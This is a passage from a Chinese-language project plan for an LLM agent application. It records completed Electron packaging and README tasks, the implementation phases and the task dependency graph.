### 任务 32：electron-builder 打包 + TESTING 验收 ✅ — `b28dc04` `cb1975c` `918ac18`

**背景**：便携 + NSIS 安装程序；`extraResources` 三件套（backend dist + node_modules + client 产物 → resources/backend）；**keytar 原生模块出 asar**（SPEC §8.5 的"目标机安全配置"落地）。

**涉及文件：**
- 修改：`desktop/package.json`（build 字段：`directories.output: build` 避开 tsc dist、`signAndEditExecutable: false`——Windows 无管理员符号链接权限，无自定义图标/签名零损失）
- 创建：`desktop/prepare-resources.mjs`（组装 backend-pack：cpSync + `npm prune --omit=dev`——分发体积 73MB→20MB，typescript/vitest 不进用户包）
- 修改：`TESTING.md`（B11 验收小节：全局命令 / 窗口自载 / 无残留进程 / 复用不重复 spawn / 端口占用错误框）

- [x] **已完成**（commits `b28dc04`（用户实现）`cb1975c` `918ac18`，82MB 双 exe 实测）——win-unpacked + portable + NSIS 三产物；**KNOWN_ISSUES #12**：打包 keytar ABI 依赖打包机 Node 版本（@electron/rebuild 只重建 app 目录依赖，extraResources verbatim 复制——修复路径：钉打包机 Node 20 或 backend-pack rebuild）

### 任务 33：README ✅ — `9d241c8` `946386c`

**背景**：Task 22（文档）的实际落地——安装（npm link + 桌面应用）、快速开始、WebUI 说明（开发/生产模式）、目录结构、安全边界、已知限制。

**涉及文件：**
- 创建：`README.md`

- [x] **已完成**（commits `9d241c8` `946386c`）——命令逐一核验（npm link bin 指向、vite 代理配置）；产物路径 `desktop/build/`（修正 plan 笔误 desktop/dist）

---

## 实现阶段

```
阶段 1:  基础             任务 1         （脚手架、类型、事件、CI）
阶段 2:  LLM 层           任务 2-3       （MockProvider、DeepSeekProvider）
阶段 3:  工具             任务 4-5       （7 个工具及测试）
阶段 4:  配置 + 记忆      任务 6-7       （配置覆盖、3 层记忆）
阶段 5:  护栏             任务 8-9       （PatternGuard、ScopeFence、HITL）
阶段 6:  反馈闭环         任务 10-12     （主力维度——5 层管线；11a/11b 为拆分的校验器）
阶段 7:  主循环           任务 13a-13b   （停机判断 + Agent 主循环 + 集成测试）
阶段 8:  凭据             任务 14-15     （后端 + Store + SecureHandle）
阶段 9:  CLI              任务 16        （commander + key/config 命令）
阶段 10: WebUI            任务 17-18b    （Express/WS 服务器 + React SPA；18a/18b 拆分前端）
阶段 11: 集成             任务 19        （完整集成 + --web）
阶段 12: 演示             任务 20        （§A.6 机制演示）
阶段 13: 分发             任务 21        （Dockerfile + npm 配置）
阶段 14: 文档             任务 22        （README）
阶段 15: WebUI/CLI 增强    任务 23-27     （用户真实测试后提出的产品改进；依赖阶段 10-11 完成）
阶段 16: 分发落地          任务 28-33     （2026-08-05 用户建议"输入产品名启动 CLI / 桌面应用连 WebUI"；生产模式 + npm link + Electron 桌面壳 + 打包 + README；依赖阶段 11/14 完成）
```

**拆分后任务总数**：36（Task 11→11a/11b、Task 13→13a/13b、Task 18→18a/18b、Task 23-27 为阶段 15 产品增强、Task 28-33 为阶段 16 分发落地）

**可并行的任务对**：任务 2+4（LLM + 工具）、任务 6+8（配置 + 护栏）、任务 10+14（反馈 + 凭据）、任务 17+20（WebUI 服务器 + 演示）

---

## 任务依赖图

```
 1 ──→ {2→3, 4→5} ──→ {6, 7} ──→ {8→9, 10→11a→11b→12} ──→ 13a→13b
                                                                   │
 14→15 ──→ 16 ──→ {17→18a→18b, 20} ──→ 19 ──→ 21 ──→ 22
                                                          └─→ 28→29→{30→31→32, 33}
```
